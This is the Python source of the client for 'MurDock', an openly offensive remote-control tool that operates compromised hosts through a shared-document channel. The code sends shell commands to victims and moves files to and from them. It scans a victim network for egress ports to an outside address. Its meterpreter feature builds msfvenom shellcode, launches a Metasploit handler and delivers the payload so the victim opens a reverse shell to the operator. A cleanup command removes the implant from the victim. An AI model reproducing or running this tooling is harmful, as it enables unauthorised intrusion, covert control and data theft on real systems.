#!/usr/bin/python
import logging
import os
import sys
import subprocess 
import shlex
import socket
import random
from time import sleep
from hashlib import md5
from docBuffer import docClientBuffer
from ast import literal_eval
from string import ascii_uppercase, digits



### GLOBALS ###

# Debug Logging Object and Handle
# Will log to file if exe
DEBUG = False

logger = logging.getLogger('__docCLIENT__')
if not DEBUG:
    logger.setLevel(logging.ERROR)
else:
    logger.setLevel(logging.DEBUG)
ch = logging.StreamHandler()
if not DEBUG:
    ch.setLevel(logging.ERROR)
else:
    ch.setLevel(logging.NOTSET)
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
ch.setFormatter(formatter)
logger.addHandler(ch)

# Remote OS, set in syncUp()
OS = ''  

# Egress Port, set in egressBust(), cleared on syncUp()
EGRESSPORT = ''

# Blocksize Used in File Transfer
BLOCKSIZE=2**10

# Force Unbuffered stdout
sys.stdout = os.fdopen(sys.stdout.fileno(), 'w', 0)



### File Transfer Functions###

# Upload file to remote host
def upload(docBuffer, cmdStr):
    BLOCKSIZE
    cmdList = shlex.split(cmdStr)
    localPath = os.path.expandvars(cmdList[1].replace('~','$HOME')) # expand & handle ~
    if OS == 'Windows':
        remotePath = shlex.split(cmdStr.replace('\\','\\\\'))[2]# pad removal of \ by shlex
    else:
        remotePath = cmdList[2]
    uploadStr = '!upload.' + remotePath.encode('base64','strict').strip('\n')
    localFileExist = os.path.exists(localPath)

    if localFileExist:
        try:
            open(localPath,"rb")
            docBuffer.sendData(uploadStr)
        except IOError:
            return "ERROR - local: Can not read to local file: " + localPath
       
        try:
            canSend = docBuffer.readData()
        except Exception as e:
            return str(e)
        if canSend == "<OKAYSND>": #can upload?
            try:
                fd = open(localPath,"rb") #open for readd
                md5Obj = md5() # md5 object
                fileSize = os.path.getsize(localPath)
                sentSize = 0
                
                data = fd.read(BLOCKSIZE)
                md5Obj.update(data)
                docBuffer.sendData("<BOF>." + data.encode('base64','strict') )
                sentSize += BLOCKSIZE
                if sentSize >= fileSize:
                    print "0% .. 100%"
                else:
                    print "0%% .. %3.2F%%  .. " % ( 100 * (sentSize / float(fileSize)) ),
                    
                while True:
                    data = fd.read(BLOCKSIZE)
                    if not data:
                        fileHash = md5Obj.digest().encode('base64','strict')
                        try:
                            docBuffer.sendData("<EOF>." + fileHash )
                        except Exception as e:
                            return str(e)                  
                        print "Send Complete, waiting for remote integrity check."
                        break
                   
                    #Anti-Clobber
                    toWrite = docBuffer.CLIENT_WRITE_COL + str(docBuffer.getToWrite())
                    currentData = docBuffer.getCellData(toWrite)
                    
                    while(currentData != "<NULL>" and currentData != "<READ>"):
                        print " ... ",
                        sleep(1)
                        currentData = docBuffer.getCellData(toWrite)
                                  
                    md5Obj.update(data)    
                    docBuffer.sendData(data.encode('base64','strict') )
                    sentSize += BLOCKSIZE
                 
                    if sentSize >= fileSize:
                        print " 100%"
                    else:
                        print "%3.2F%%  .. " % ( 100 * (sentSize / float(fileSize)) ), 
                try:        
                    integrityCheck = docBuffer.readData()
                except Exception as e:
                    return str(e)   
                if  integrityCheck == "<OKAYRCV>":
                    return "\nFile transfered successfully, integrity verified."
                elif integrityCheck == "<OKAYFAIL>":
                    return "ERROR -remote: Remote integrity check failed, deleting remote file."                    
            except IOError:
                return "ERROR - local: can not read file : " + localPath
        else:
            return "ERROR - remote: Remote path: " + remotePath + " does not exist or insufficient permissions." 
            
    elif not localFileExist:
        return "ERROR - local: Local File: " +  localPath + " does not exist."


# Download remote file to local host
def download(docBuffer, cmdStr):
    BLOCKSIZE
    cmdList = shlex.split(cmdStr)
    if OS == 'Windows':
        remotePath = shlex.split(cmdStr.replace('\\','\\\\'))[1]# pad removal of \ by shlex
    else:
        remotePath = cmdList[1]
    localPath = os.path.expandvars(cmdList[2].replace('~','$HOME')) # expand paths and handle ~ shortcut
    tmpFile = localPath + ".tmp"   
    dloadStr = '!download.' + remotePath.encode('base64','strict').strip('\n')
    canRcv = ''
    existBefore = os.path.exists(localPath)
    
    #can write localPath?
    try:
        open(localPath,"wb")
        docBuffer.sendData(dloadStr)
    except IOError:
        return "ERROR: Can not write to local file: " + localPath
    
    try:
        canRcv = docBuffer.readData()
    except Exception as e:
        return str(e)
        
    if canRcv.startswith("<OKAYRCV>"):  
        try:
            fd = open(tmpFile, "wb")
            md5Obj = md5()
            fileSize = int( canRcv.split(".")[1] )
            rcvSize = 0
            
            #first block read
            try:
                rawData = docBuffer.readData()
            except Exception as e:
                return str(e)
            dataList = rawData.split('.')
            if dataList[0] != "<BOF>":
                docBuffer.lastReadUpdate( docBuffer.getToRead() )
                return "ERROR: download() - Data BOF format error."
            binData = dataList[1].decode('base64','strict') 
            fd.write(binData)      
            md5Obj.update(binData)
            rcvSize += BLOCKSIZE
            if rcvSize >= fileSize:
                print " 100%"
            else:
                print "%3.2F%%  .. " % ( 100 * (rcvSize / float(fileSize)) ), 
            
            while binData != "<EOF>" :
                try:
                    binData = docBuffer.readData()
                except Exception as e:
                    return str(e)
                
                if binData == "<READ>" or binData == "<NULL>": #should never get these from the readData method
                    pass 
                elif binData.startswith("<EOF>"):
                    fd.close()
                    dataList = binData.split(".")
                    binData = dataList[0]
                    fileHash = dataList[1]
                    docBuffer.lastReadUpdate( docBuffer.getToRead() ) #solves OBO error in transfer logic, may not be BEST solution
                    if fileHash == md5Obj.digest().encode('base64','strict'):
                        if os.path.exists(localPath):
                            os.remove(localPath)
                        os.rename(tmpFile, localPath)
                        return "\nFile transfered successfully, integrity verified." 
                    else:
                        if os.path.exists(tmpFile):
                            os.remove(tmpFile)
                        return "ERROR: Integrity check failed, deleting temp file."      
                else:      
                    binData = binData.decode('base64','strict')
                    fd.write(binData)
                    md5Obj.update(binData)
                    rcvSize += BLOCKSIZE
                    if rcvSize >= fileSize:
                        print " 100%"
                    else:
                        print "%3.2F%%  .. " % ( 100 * (rcvSize / float(fileSize)) ),                           
        except IOError:
            return "ERROR: Cannot write to file: " + tmpFile
    else:
        if not existBefore:
            os.remove(localPath)
        return "ERROR: remote path does not exist or insufficient permissions." 



### SHELL UPGRADES ###

# Check for egress TCP port
# to an IPV4 address
# TODO: Add UDP and IPv6
def egressBust(docBuffer):
    """Update topPorts file with the following command: 
       sort -r -n -k 3 /<pathto>/nmap-services | grep -i tcp | awk '{print $2}' | cut -d/ -f1 > /<docDoorPath>/top-ports """
    targetIP = ''
    portList = ''
    topPortsPath = "../top-ports"
    minPort = 0
    maxPort = 65535
    threads = 0
    global EGRESSPORT
    
    print "\n *** Choose an egress method (TCP only) ***\n"
    method = 99
    while method not in range(1, 6):
        print "1. Check a X ports by % prevalence in nmap-service file. (X)"
        print "2. Check a given range of ports. (X-Y)"
        print "3. Enter comma delimited list of ports. (X,Y,Z,A,F,B,J...)"
        print "4. Print stored egress port for this session"
        print "5. No thanks... return to shell"
        try:
            method = int(raw_input('Method (1-5): '))
        except:
            method = 99           
    if method == 1: # top X
        topPortsCount = 0
        try:
            with open(topPortsPath) as f:
                topPortsCount = sum(1 for line in f)
        except:
            print "ERROR: Top Ports File missing"
            return 
        print "\nTry top X ports in the NMAP services file."
        portCount = 0  
        while portCount not in range (1, topPortsCount + 1):
            if portCount > topPortsCount:
                print "\n*** Only %s ports are available. ***" % topPortsCount
            print "How many ports would you like to check?"
            try:
                portCount = int(raw_input('Check: '))
            except:
                portCount = 0
        with open(topPortsPath, 'r') as myFile:
            portList = [myFile.next() for line in xrange(portCount)]
        portList = ','.join([nl.rstrip() for nl in portList])     
    elif method == 2:# port range
        minChoice = -1; maxChoice = 99999
        while minChoice < minPort or maxChoice > maxPort or minChoice > maxChoice:
            if minChoice < minPort or maxChoice > maxPort or minChoice > maxChoice:
                print "\n*** Out of Bounds: Min=0  Max=65535 ***"
            print "Scan port range Min - Max?"
            try:
                minChoice = int(raw_input('Min Port: '))
                maxChoice = int(raw_input('Max Port: '))
            except:
                minChoice = -1
                maxChoice = 99999
        portList = "%s-%s" % (minChoice, maxChoice)
    elif method == 3: # custom list
        isValid = False
        while not isValid:
            print "\nEnter comma separated port list. (X,Y,Z,A,F,B,J...)"
            try:
                portList = raw_input('List: ').strip().split(",")
                for port in portList:
                    port = int(port)
                    if port < minPort or port > maxPort:
                        print "\n *** Error - Invalid port in range: %s" % port
                        isValid = False
                        break
                    else:
                        isValid = True
            except Exception, e:
                print e
                isValid = False    
        portList = ','.join(list(set(portList)))
    elif method == 4:
        if EGRESSPORT:
            return """
            *** Stored Egress Port for Session ***"
                Port: """ + EGRESSPORT + """ 
                We suggest confirming with egress method #3.
            """ 
        else:
            return """
            *** No known Egress Ports ***
     Egress Port clears on session init and !sync
            """
    else:
        print "\n"
        return ""
    
    while targetIP == '':
        try:
            targetIP = raw_input('\nExternal Egress Target IPv4 Address: ')
            socket.inet_aton(targetIP)
        except socket.error:
            print "\n*** Invalid IP Address ***"
            targetIP = ''
    while threads < 1:
        try:
            threads = int(raw_input('\nWorker Threads (default 10): '))
            threads = str(threads)
        except:
            print "Default 10 threads being used."
            threads = '10'  
    
    isCorrect = ''
    while isCorrect == '':
        print "\n*** Confirm Egress Data ***"
        print "Target IP :  %s" % targetIP
        tmpList = []
        if "-" in portList:
            minPort, maxPort = portList.split("-")
            tmpList = list(( str(port) for port in range(int(minPort), int(maxPort) + 1) ))
        else:
            tmpList = portList.split(",")    
        print "Ports Count : %s" % len(tmpList)
        print "Thread Count: %s" % threads
        try:
            isCorrect = str(raw_input('\nLaunch Check (y/n): ')).lower()
            if isCorrect.startswith('y'):
                isCorrect = 'yes'
            elif isCorrect.startswith('n'):
                isCorrect = 'no'
                return "\n*** Egress check cancelled ***\n"
            else:
                isCorrect = ''       
        except:
            isCorrect = ''

    egressCmd = "!egress|" + portList + "|" + targetIP + "|" + threads
    logger.debug(egressCmd)
    print "\n*** Delivering Request to remote host ***"
    docBuffer.sendData(egressCmd)
    try:
        while 1:
            try:
                srvResponse = docBuffer.readData()
            except Exception as e:
                if str(e) == "READ ERROR: Connection timed out.":
                    logger.debug("executing continue on : " + str(e) )
                    continue
                else:
                    logger.debug("returning with error of: " + str(e) )
                    return str(e)
            if srvResponse.startswith("<egress>"):
                egressList = srvResponse.split(".")
                if  egressList[1] == "<started>":
                    print "\n*** Range accepted ***"
                    print "Searching %s ports with %s worker threads." % (egressList[2].strip("<>"), threads)
                    print "This may take a while..."
                elif egressList[1] == "<failed>":
                    return "\n*** ERROR: Egress Check Failed ***"
                elif egressList[1] == "<open>":
                    EGRESSPORT = egressList[2].strip("<>")
                    return "\n*** OPEN - Egress port: %s ***\n" % EGRESSPORT    
                elif egressList[1] == "<closed>":
                    return "\n*** CLOSED - All checked ports closed ***\n"
    except KeyboardInterrupt:
        print "Interrupt caught.\n"
        return

        

    
# Upgrade control to meterpreter shell
# Takes user input and feeds to msfvenom
def meterUp(docBuffer):
    ip = ''
    port = ''
    isHandler = ''
    payload = ''
    isCorrect = 'no'
    
    venomPath = localCmd("which msfvenom").rstrip('\r\n')
    payldPath = localCmd("which msfpayload").rstrip('\r\n')
    if not venomPath or not payldPath:
        return "\n*** ERROR: msfvenom or msfpayload not found, exiting !meterup ***"
    if OS.lower() != "windows":
        return "\n*** ERROR: victim not Windows platform, exiting !meterup ***"
    
    print "\n*** Interactive meterpreter Upgrade ***"
    while isCorrect == 'no':
        print "\nHint - Local IP: " + localCmd("hostname -I").strip("\n") + " - External IP: <>" #TODO: Add remote query for IP address
        while ip == '':
            try:
                ip = str(raw_input('LHOST IP Address ?: '))
            except:
                ip = ''         
        print "\nHint - use !egress to acquire ports."
        if not EGRESSPORT == '':
            print "Known OPEN: %s" % EGRESSPORT    
        while port == '':
            try:
                port = str(raw_input('LPORT Port Number ?: '))
            except:
                port = ''                  
        while payload == '':#msfpayload to list payloads      
            print "\nGenerating Payload List... "
            try:
                payloadsLst = subprocess.check_output("msfpayload -l | grep -e 'windows.*\/meterpreter'" + \
                                                      " | awk {'print $1'}", shell=True).strip("\t").splitlines()
                for index, pload in enumerate(payloadsLst):
                    print index, pload
                payload = str(raw_input('\nPlease select a payload by number (#): '))    
                
                try:
                    payload = payloadsLst[int(payload)]
                except ValueError:
                    payload = ''        
            except:
                payload = ''
        print "\nAutomatically spawn handler... ?"
        print "Assumes a graphical environment with x-terminal-emulator.\n"       
        while not (isHandler == "yes" or isHandler == "no"):
            try:
                isHandler = str(raw_input('Handle Shell?(Y/n): ')).lower()
                if isHandler.startswith('y'):
                    isHandler = "yes"
                elif isHandler.startswith('n'):
                    isHandler = "no"
            except:
                isHandler = ''              
        valid = ['yes', 'no', 'exit']
        isCorrect = ''
        while isCorrect not in valid:
            print "\nIs the below information correct? "
            print "LHOST: " + ip + "\nLPORT: " + port + "\nPayload: " + payload + "\nHandler: " + isHandler   
            try:
                isCorrect = str(raw_input('Y/N or exit(to cancel): ')).lower()
                if isCorrect.startswith('y'):
                    isCorrect = 'yes'
                elif isCorrect.startswith('n'):
                    isCorrect = 'no'
                    ip = ''
                    port = ''
                    payload = ''
                    isHandler = ''
                    clearLocal()
                elif isCorrect == "exit":
                    print "Operation cancelled."
                    return       
            except:
                isCorrect = 'no'
    
    if isHandler == "yes":
        print "\n\nOpening multi-handler for IP: " + ip + " on port: " + port
        handlerFileData = "use exploit/multi/handler/\n" + \
            "set payload " + payload + "\n" + \
            "set LHOST " + ip + "\n"  + \
            "set LPORT " + port + "\n"  + \
            "set ExitOnSession false\n"  + \
            "set EnableStageEncoding true\n"  + \
            "exploit -j\n"
        randPath = ''.join(random.choice(ascii_uppercase + digits) for char in range(12))
        handlerPath = randPath + ".rc" 
        while os.path.exists(handlerPath):
            randPath = ''.join(random.choice(ascii_uppercase + digits) for char in range(12))
            handlerPath = randPath + ".rc" 
        try:
            fd = open(handlerPath,"wb")
            fd.write(handlerFileData)
            fd.close()
        except IOError:
            return "ERROR: can not write handler resource file."
        logger.debug('creating file ./%s' % handlerPath)
        command = "msfconsole -r ./%s" % handlerPath
        #command = "msfcli exploit/multi/handler PAYLOAD=" + payload + " LHOST=" + ip + " LPORT=" + port + " E"
        command = 'sudo /bin/bash -l -c "' + command + '"'
        command = "x-terminal-emulator -e '" + command + "'" 
        subprocess.Popen(shlex.split(command))
        
        handlerUp = ''
        while handlerUp != 'yes':
            try:
                handlerUp = str(raw_input('\nHandler ready? Y/(N to exit): ')).lower()
                if handlerUp.startswith('y'):
                    handlerUp = 'yes'
                elif handlerUp.startswith('n'):
                    return "*** Handler Error: !meterup cancelled ***"   
                else:
                    handlerUp = '' 
            except:
                handlerUp = ''        
        
    print "\n\nGenerating shellcode Byte Array with msfvenom"
    shellCode = localCmd(venomPath + " -p " + payload + " LPORT=" + port + " LHOST=" + ip + " -f raw")
    print "Delivering payload... "
    try:
        if isHandler == "yes":
            try:
                os.remove(handlerPath)
            except OSError:
                logger.debug('Failed to remove handler file')
            docBuffer.sendData("!meterup." + shellCode.encode("base64", "strict") )
        return docBuffer.readData()
    except:
        if isHandler == "yes":
            try:
                os.remove(handlerPath)
            except OSError:
                logger.debug('Failed to remove handler file')
        return "failed to send shell code"               


def forwardPort(docBuffer):
    return "*** ERROR: Removed from public release ***\n"


# Executes commands on local system
# Assumes Linux host 
# parse bases on "" all following space input to pipe 
def localCmd(commandIn):
    try:
        process = subprocess.Popen(commandIn, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output = process.communicate() #TODO: consider changing to stdout, stderr = process.communicate() for clarity   
        if output[1] == '':
            return output[0]
        if output[0] and output[1]:
            return output[0] + output[1]
        else:
            return output[1]
    except OSError:
        return "\nERROR: OSError" #TODO, pass specific error back



### HELPER FUNCTIONS ###

# Prints Main Menu
def introPrint():
    print """
        ~ MurDock v1.0 beta ~
        Author: Themson Mester
        Release: Public
        License: MIT
        EULA: Be Excellent to each other
        Help: !help
    """
    

# Prints Help Menu
def helpPrint():
    print """
      ~ MurDock v1.0 Public ~
      *** commands ***
      !help     - Print this help menu : (!h)
      !clear    - Clear local terminal : (!c)
      !watch    - Looped listener for incoming shells              
      !cmd      - Execute local command - Usage : !cmd <command string>
      !sysinfo  - Print System info of remote host
              
      !upload   - Usage : !upload <local_file_path> <remote_file_path>
      !download - Usage : !download <remote_file_path> <local_file_path>
                  
      !egress   - Find egress ports out of remote network - Interactive
      !meterup  - Upgrade to meterpreter shell - Interactive
      !forward  - Forward local socket to remote socket - (disabled)
        
      !sync     - Synchronize buffers with remote server  
      !shutdown - Shutdown remote docServer. Does not remove binary
      !cleanup  - Shutdown remote docServer and remove binary
      !exit     - Exit Local client only
        
      <:        - Send command to remote server
    """
    

# Clear local buffer   
def clearLocal():
    print "\n" * 1000
   

# Send shutdown signal to remote server
def sendShutdown(docBuffer):
    affirmatives = ["y", "yes"]
    negatives = ["n", "no"]
    choice = ''
    
    print " *** Warning: Don't be Sloppy! ***"
    print "You are about to shut down the remote server, leaving behind a binary."
    
    while choice == '':
    #handle non-string types
        try:
            choice = str(raw_input('Want to Be Sloppy? Y/N: '))
        except:
            choice = ''
            
        if choice.lower() in affirmatives:
            print "Sending shutdown signal: ",
            docBuffer.sendData("!shutdown")
            srvResponse = docBuffer.readData()
            if srvResponse == "<GOTSHUT>":
                print "\n*** Remote server has been shut down. ***"
                return
            else:
                print " *** Error: Remote Shutdown Failed *** "
                print "If server is non-responsive there may be no resolution."
                print "If server is responsive but out of synch, issue the !synch command before shutting down."
                return
        elif choice.lower() in negatives:
            return
        else:
            choice = ''


# Send cleanup signal to remote server
# and close local client
def cleanUp(docBuffer):
    affirmatives = ["y", "yes"]
    negatives = ["n", "no"]
    choice = ''
    
    if OS.lower() != "windows":
        print "\n*** Removal method not yet available for %s ***\n" % OS
        return
    
    print "\n                       *** WARNING ***"
    print "This feature is blind, there will be no feedback once executed."
    print "You are about to SHUT DOWN the remote server, and REMOVE the binary."
    
    while choice == '':  #handle non-string types
        try:
            choice = str(raw_input('\nAre you sure you want to CLEANUP now? Y/N: '))
        except:
            choice = ''     
        if choice.lower() in affirmatives:
            print "Sending CLEANUP signal... "
            docBuffer.sendData("!cleanup")
            print "\nAnd like that, "#TODO: Add a readData() confirmation here
            sleep(3)
            clearLocal()    
            print """
                    .(  . * .
                  .*  .      ) .
                 .. He's gone .*.
                  '* . (    .) '
                   ` ( *  . *
            """
            return         
        elif choice.lower() in negatives:
            return
        else:
            choice = ''
    

# Print exit info for client exit
def exitClient():
    print """
            ~ Exited Local MurDock Client ~
                
            WARNING: 
            This does NOT terminate the remote server.
            """
    sys.exit()


# Retrieve remote system info  
# Print and return data as list
def sysInfo(docBuffer):
    print "\nPolling Remote Host for !sysinfo..."
    docBuffer.sendData("!sysinfo")
    try:
        sysData = literal_eval(docBuffer.readData())
    except Exception as e:
        print str(e)
        exitClient()
    print "\n\n*** Remote System Info ***"
    for worker in sysData:
        print worker
    print ''      
    return sysData


# Synch docBuffers
# Print and store system info
# Sets Remote OS global var
def syncUp(docBuffer):
    global OS
    global EGRESSPORT
    EGRESSPORT = ''
    if docBuffer.syncUp():
        print "\n *** Connection with compromised host synchronized. ***"
        sysData = sysInfo(docBuffer)
        OS = sysData[0].split(":")[1].strip(" ")
        return True
    else:
        return False      


## Watch for new shell in loop
#  uses syncUp() bool in loop to watch for shell
#  stop on True or keyboard interrupt
def watchNew(docBuffer):
    delay = 5
    print "\n *** Listening for compromised hosts ***"
    print "Exit listener with keyboard interrupt: ^c"
    try:
        while not syncUp(docBuffer):
            if delay > 30:
                delay = 30
            sleep(delay)
            delay += 5
    except KeyboardInterrupt:
        print "Interrupt caught, watcher terminated\n"
        return
    
                
            
# Main method
def main():     
    #banner
    introPrint()
    #Instantiate docBuffer object
    try:
        docBuffer = docClientBuffer()
    except Exception as e:
        print "*** ERROR: Failed to instantiate buffer. *** - " + str(e)
        exitClient()
           
    ## primary input/send/read/output loop ##
    shellInput = ''
    while (shellInput != '!exit'):      
        #Local STDIN Read
        shellInput = ''
        while shellInput == '':
        #handle non-string types
            try:
                shellInput = str(raw_input('<: '))
                logger.debug("Main() shellInput set: " + shellInput)
            except:
                shellInput = ''
       
        #TODO: MOVE TO COMMAND PROCESSOR Function
        #built-ins 
        menDrvCmds = ['!help', '!h', '!clear', '!c','!watch', '!sysinfo','!egress', '!meterup', '!forward', '!sync', '!exit', '!shutdown', '!cleanup']
        parsedCmds = ['!cmd ', '!upload','!download',]
        if shellInput.startswith('!') and shellInput in menDrvCmds:
            if shellInput == '!help' or shellInput == '!h':
                helpPrint()
            elif shellInput == '!clear' or shellInput == '!c':
                clearLocal()
            elif shellInput == '!watch':
                watchNew(docBuffer)  
            elif shellInput == "!sysinfo":
                sysInfo(docBuffer)
            elif shellInput == "!egress":
                print egressBust(docBuffer)
            elif shellInput == '!meterup':
                print meterUp(docBuffer)
            elif shellInput == '!forward':
                print forwardPort(docBuffer)
            elif shellInput == '!sync':
                print "Attempting to synchronize with compromised host server."
                if not syncUp(docBuffer):
                    print "\n*** SYNC FAILED: No server or Lost Auth ***" 
                    exitClient()        
            elif shellInput == '!exit':
                exitClient()
            elif shellInput == "!shutdown":
                sendShutdown(docBuffer)
            elif shellInput == "!cleanup":
                cleanUp(docBuffer)
            
        #Parsed Exec        
        elif shellInput.startswith('!cmd '):
            print localCmd( shellInput.split(" ", 1)[1] )           
        elif shellInput.startswith('!upload'):
                print upload(docBuffer, shellInput)
        elif shellInput.startswith('!download'):
                print download(docBuffer, shellInput)
        

        #Handle invalid builtins
        elif shellInput.startswith('!') and (shellInput not in menDrvCmds) and (shellInput not in parsedCmds):
            print "Built-in command \"" + shellInput + "\" not found."
        
        #Raw cmd to remote host  
        else:
            #Send local STDIN
            docBuffer.sendData(shellInput)
            #Read remote STDOUT 
            try:
                srvData = docBuffer.readData()
                print "\n" + srvData + "\n"
            except Exception as e:
                print str(e)
     
            
if __name__ == "__main__":
    main()
